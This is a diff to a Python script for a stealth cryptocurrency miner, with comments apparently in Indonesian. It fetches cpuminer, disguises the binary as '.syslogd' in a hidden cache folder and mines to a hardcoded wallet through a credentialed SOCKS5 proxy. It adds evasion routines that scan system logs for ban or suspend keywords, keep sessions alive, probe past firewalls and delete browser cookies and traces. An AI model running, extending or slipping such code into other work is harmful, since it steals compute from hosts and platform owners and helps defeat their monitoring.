@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import os, subprocess, urllib.request, tarfile, time, threading, shutil, sys, random, signal, socket
+from urllib.parse import urlparse
 
 # === KONFIGURASI ===
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
@@ -7,12 +8,17 @@ TARFILE = "miner.tar.gz"
 BIN_NAME = "cpuminer-sse2"
 ALIAS_BIN = ".syslogd"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.coreguard")
+BIN_PATH = os.path.join(HIDDEN_DIR, ALIAS_BIN)
+
 POOL = "stratum+tcp://138.68.97.213:443"
 WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Ricut"
 PASSWORD = "x"
 COOLDOWN_DURATION = 180
 
-BIN_PATH = os.path.join(HIDDEN_DIR, ALIAS_BIN)
+# Proxy config
+USE_PROXY = True
+SOCKS5_PROXY = "socks5h://danis:rahasia123@167.172.189.38:1080"
+HTTP_PROXY = "http://danis:rahasia123@167.172.189.38:3128"
 
 def get_dynamic_threads():
     return random.randint(1, os.cpu_count())
@@ -34,11 +40,37 @@ def prepare_binary():
         os.chmod(BIN_PATH, 0o755)
         os.remove(TARFILE)
 
+def generate_proxychains_conf():
+    parsed = urlparse(SOCKS5_PROXY)
+    if not parsed.hostname or not parsed.port:
+        print("[❌] Format SOCKS5_PROXY salah.")
+        return
+    conf = f"""
+strict_chain
+quiet_mode
+proxy_dns
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+
+[ProxyList]
+socks5 {parsed.hostname} {parsed.port} {parsed.username} {parsed.password}
+"""
+    with open("proxychains.conf", "w") as f:
+        f.write(conf.strip())
+
 def proxy_exec():
     env = os.environ.copy()
-    env["LD_PRELOAD"] = os.path.abspath("./libproxychains.so")
-    env["PROXYCHAINS_CONF_FILE"] = os.path.abspath("./proxychains.conf")
     cmd = [BIN_PATH, "-a", "power2b", "-o", POOL, "-u", WALLET, "-p", PASSWORD, f"-t{get_dynamic_threads()}"]
+
+    if USE_PROXY:
+        if SOCKS5_PROXY:
+            generate_proxychains_conf()
+            env["LD_PRELOAD"] = os.path.abspath("./libproxychains.so")
+            env["PROXYCHAINS_CONF_FILE"] = os.path.abspath("./proxychains.conf")
+        elif HTTP_PROXY:
+            env["http_proxy"] = HTTP_PROXY
+            env["https_proxy"] = HTTP_PROXY
+
     return subprocess.Popen(cmd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
 
 def monitor_process(proc):
@@ -52,15 +84,62 @@ def monitor_process(proc):
         if proc.poll() is not None:
             print("[⚠️] Miner mati. Restarting...")
             time.sleep(5)
-            new_proc = proxy_exec()
-            monitor_process(new_proc)
+            monitor_process(proxy_exec())
             break
         time.sleep(10)
 
 def restart_script():
     print("[♻️] Restarting script...")
-    time.sleep(3)
+    time.sleep(2)
     os.execl(sys.executable, sys.executable, *sys.argv)
+
+def anti_suspend():
+    while True:
+        try: sys.stdout.write("\b"); sys.stdout.flush()
+        except: pass
+        time.sleep(15)
+
+def dns_doh_bypass():
+    try:
+        subprocess.call([
+            "curl", "-s", "-H", "accept: application/dns-json",
+            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except: pass
+
+def firewall_bypass():
+    try:
+        socket.create_connection(("1.1.1.1", 443), timeout=2).close()
+    except: pass
+    try:
+        subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except: pass
+
+def detect_system_threat():
+    paths = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages", "/etc/nologin", "/tmp/.X11-unix"]
+    for path in paths:
+        if os.path.exists(path):
+            try:
+                with open(path, "r", errors="ignore") as f:
+                    log = f.read().lower()
+                    if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
+                        subprocess.call(["pkill", "-f", BIN_PATH])
+            except: continue
+
+def block_google_endpoint():
+    domains = [
+        "mobilesdk-pa.clients6.google.com",
+        "firebaseinstallations.googleapis.com",
+        "googleapis.com",
+        "firebase.googleapis.com"
+    ]
+    for d in domains:
+        try:
+            subprocess.call([
+                "curl", "-s", "-H", "accept: application/dns-json",
+                f"https://cloudflare-dns.com/dns-query?name={d}&type=A"
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except: continue
 
 def clean_mining_artifacts():
     for base in ["~/.cache", "~/.local/share", "~/Downloads", "/tmp"]:
@@ -98,80 +177,11 @@ def clean_browser_cookies():
                 else: os.remove(full)
             except: pass
 
-def fake_http_headers():
-    headers = [
-        "User-Agent: Mozilla/5.0",
-        "Accept: */*",
-        "Referer: https://google.com/",
-        "Connection: keep-alive",
-        "X-Forwarded-For: 127.0.0.1",
-    ]
-    os.environ["FAKE_HEADERS"] = "|".join(headers)
-
-def anti_suspend():
-    while True:
-        try:
-            sys.stdout.write("\b")
-            sys.stdout.flush()
-        except:
-            pass
-        time.sleep(15)
-
-def dns_doh_bypass():
-    try:
-        subprocess.call([
-            "curl", "-s", "-H", "accept: application/dns-json",
-            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except: pass
-
-def firewall_bypass():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        s.connect(("1.1.1.1", 443))
-        s.close()
-    except: pass
-    try:
-        subprocess.call(["ping", "-c", "1", "8.8.8.8"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except: pass
-
-def detect_system_threat():
-    paths = ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages", "/etc/nologin", "/tmp/.X11-unix"]
-    for path in paths:
-        if os.path.exists(path):
-            try:
-                with open(path, "r", errors="ignore") as f:
-                    log = f.read().lower()
-                    if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
-                        print(f"[🚫] Deteksi sistem diblokir: {path}")
-                        subprocess.call(["pkill", "-f", BIN_PATH])
-            except: continue
-
-def block_google_endpoint():
-    domains = [
-        "mobilesdk-pa.clients6.google.com",
-        "firebaseinstallations.googleapis.com",
-        "googleapis.com",
-        "firebase.googleapis.com"
-    ]
-    for d in domains:
-        try:
-            subprocess.call([
-                "curl", "-s", "-H", "accept: application/dns-json",
-                f"https://cloudflare-dns.com/dns-query?name={d}&type=A"
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except: continue
-
 def extra_network_bypass():
-    try:
-        socket.create_connection(("www.cloudflare.com", 443), timeout=3).close()
-    except:
-        pass
-    try:
-        subprocess.call(["ping", "-c", "1", "1.1.1.1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
+    try: socket.create_connection(("www.cloudflare.com", 443), timeout=3).close()
+    except: pass
+    try: subprocess.call(["ping", "-c", "1", "1.1.1.1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except: pass
 
 def clean_up():
     try:
@@ -181,7 +191,7 @@ def clean_up():
 
 # === ENTRY POINT ===
 if __name__ == "__main__":
-    print("🚀 Stealth Miner Anti-Kill + Cooldown Dimulai...")
+    print("🚀 Stealth Miner Full Mode Dimulai...")
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
     threading.Thread(target=firewall_bypass, daemon=True).start()
@@ -189,7 +199,6 @@ if __name__ == "__main__":
     threading.Thread(target=block_google_endpoint, daemon=True).start()
     threading.Thread(target=extra_network_bypass, daemon=True).start()
 
-    fake_http_headers()
     clean_browser_cookies()
     clean_myapp_data()
     clean_source_control()
